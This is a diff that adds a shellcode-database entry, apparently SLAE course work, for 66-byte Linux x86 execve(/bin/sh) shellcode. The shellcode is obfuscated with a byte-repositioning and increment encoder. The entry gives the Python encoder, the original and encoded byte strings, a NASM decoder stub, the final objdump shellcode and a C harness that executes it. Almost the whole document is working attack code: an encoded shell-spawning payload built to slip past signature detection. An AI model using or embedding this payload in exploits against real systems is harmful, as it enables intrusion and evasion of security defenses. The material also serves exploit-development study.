@@ -1,0 +1,106 @@
+# Title: Linux/x86 - Reposition + INC encoder with execve(/bin/sh) Shellcode (66 bytes)
+# Author: Jonathan So
+# Date: 15/06/2019
+# Purpose: decode and spawn a /bin/sh shell
+# Tested On: Linux kali 4.19.0-kali4-686 #1 SMP Debian 4.19.28-2kali1 (2019-03-18) i686 GNU/Linux
+# Arch: x86
+# Size: 66 bytes
+# Write-up Link: https://xmilkpowderx.github.io/2019-06-15-SLAEEX4/
+
+======================================================Python Encoder======================================================
+
+#!/usr/bin/python
+#execve(/bin/sh)
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+
+encoded = ""
+encodedP2 = ""
+encoded2 = ""
+encoded2P2 = ""
+count = 1
+
+print 'Encoded shellcode ...'
+
+#Rearrange the position of shellcode and increase each of them by 1
+for x in bytearray(shellcode) :
+	x += 1
+	if count % 2 != 0:
+		encoded += '\\x'
+		encoded += '%02x' % x
+	else:
+		encodedP2 += '\\x'
+		encodedP2 += '%02x' % x
+	if count % 2 != 0:
+		encoded2 += '0x'
+		encoded2 += '%02x,' % x
+	else:
+		encoded2P2 += '0x'
+		encoded2P2 += '%02x,' % x
+	count += 1
+
+print encoded + encodedP2
+print encoded2 + encoded2P2
+
+print 'Len: %d' % len(bytearray(shellcode))
+print 'Replace number to: %d' % (count/2)
+
+======================================================Encoded Shellcode======================================================
+
+Original:   \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+Encoded:    \x32\x51\x30\x74\x69\x63\x6f\xe4\x8a\x54\xe2\x0c\x81\xc1\x69\x30\x69\x30\x6a\x8a\x51\xe3\x8a\xb1\xce
+
+========================================================Decoder.nasm=========================================================
+
+global _start			
+
+section .text
+_start:
+
+	jmp short call_shellcode
+decoder:
+	pop esi
+	lea edi, [esi + 13]		;half of encoded shellcode len = 25/2 = 13
+	xor ebx, ebx
+	xor ecx, ecx
+	mul ecx
+	mov edx, esp
+	mov cl, 13
+decode:                     		;Rearrange the value of shellcode
+	mov bl, byte[esi]		;get value from esi
+	dec ebx				;decrease by 1
+	mov byte[edx + eax], bl
+	inc eax
+	mov bl, byte[edi]		;get value from edi
+	dec ebx				;decrease by 1
+	mov byte[edx + eax], bl
+	inc eax
+	inc esi
+	inc edi
+	loop decode
+
+	jmp edx
+
+call_shellcode:
+
+	call decoder
+	EncodedShellcode: db 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce
+
+======================================================objdump Generated Shellcode======================================================
+
+\xeb\x22\x5e\x8d\x7e\x0d\x31\xdb\x31\xc9\xf7\xe1\x89\xe2\xb1\x0d\x8a\x1e\x4b\x88\x1c\x02\x40\x8a\x1f\x4b\x88\x1c
+\x02\x40\x46\x47\xe2\xee\xff\xe2\xe8\xd9\xff\xff\xff\x32\x51\x30\x74\x69\x63\x6f\xe4\x8a\x54\xe2\x0c\x81\xc1\x69
+\x30\x69\x30\x6a\x8a\x51\xe3\x8a\xb1\xce
+
+============================================================Proof of Concept============================================================
+
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\xeb\x22\x5e\x8d\x7e\x0d\x31\xdb\x31\xc9\xf7\xe1\x89\xe2\xb1\x0d\x8a\x1e\x4b\x88\x1c\x02\x40\x8a\x1f\x4b\x88\x1c\x02\x40\x46\x47\xe2\xee\xff\xe2\xe8\xd9\xff\xff\xff\x32\x51\x30\x74\x69\x63\x6f\xe4\x8a\x54\xe2\x0c\x81\xc1\x69\x30\x69\x30\x6a\x8a\x51\xe3\x8a\xb1\xce";
+
+int main(){
+	printf("Shellcode Length:  %d\n", strlen(code));
+	int (*ret)() = (int(*)())code;
+	ret();
+}
